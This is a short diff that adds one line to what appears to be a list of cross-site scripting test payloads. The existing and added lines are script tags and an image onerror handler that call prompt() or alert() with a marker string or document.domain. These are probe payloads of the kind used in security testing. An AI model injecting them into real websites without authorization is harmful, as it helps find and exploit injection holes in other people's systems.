@@ -2,3 +2,4 @@
 <script>prompt("SCAMPATEL")</script>
 <img+src=x+onerror=prompt("SCAMPATEL")>
 <script>alert(document.domain)</script>
+<script>prompt(document.domain)</script>
